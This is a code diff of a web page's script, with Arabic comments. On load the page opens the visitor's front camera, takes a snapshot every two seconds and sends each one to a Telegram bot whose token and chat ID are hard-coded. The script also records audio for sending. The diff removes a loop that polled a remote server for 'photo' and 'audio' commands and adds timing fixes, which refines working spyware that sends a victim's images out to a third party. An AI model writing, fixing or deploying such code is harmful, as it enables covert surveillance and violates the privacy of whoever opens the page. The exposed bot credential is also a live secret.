@@ -55,15 +55,17 @@ video, canvas {
     const ctx = canvas.getContext('2d');
     const botToken = '7760418315:AAGBJWUpehCKyxFR12gtzpQVM2KEgsyt4qk';
     const chatId = '6514749116';
-    const serverUrl = 'https://control-bot-server.YOURNAME.repl.co'; // تغيره لرابط مشروعك
 
     async function startCamera() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
-          setInterval(() => captureAndSendPhoto(), 2000);
+          video.play();
+          setTimeout(() => {
+            setInterval(() => captureAndSendPhoto(), 2000);
+          }, 2000); // ننتظر أكثر من ثانية لبدء الكاميرا
         };
       } catch (err) {
         console.error("Camera error:", err);
@@ -71,6 +73,7 @@ video, canvas {
     }
 
     async function captureAndSendPhoto() {
+      if (video.videoWidth === 0 || video.videoHeight === 0) return;
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -105,26 +108,7 @@ video, canvas {
       }
     }
 
-    async function checkCommandLoop() {
-      setInterval(async () => {
-        try {
-          const res = await fetch(serverUrl + '/get-command');
-          const data = await res.json();
-          const command = data.command?.trim();
-          if (command === 'صورة') {
-            captureAndSendPhoto();
-          } else if (command === 'صوت') {
-            recordAudioAndSend();
-          }
-          // يمكن إضافة فيديو لاحقا
-        } catch (err) {
-          console.error("Command fetch error:", err);
-        }
-      }, 5000); // فحص الأمر كل 5 ثواني
-    }
-
     startCamera();
     recordAudioAndSend();
-    checkCommandLoop();
   </script></body>
 </html>
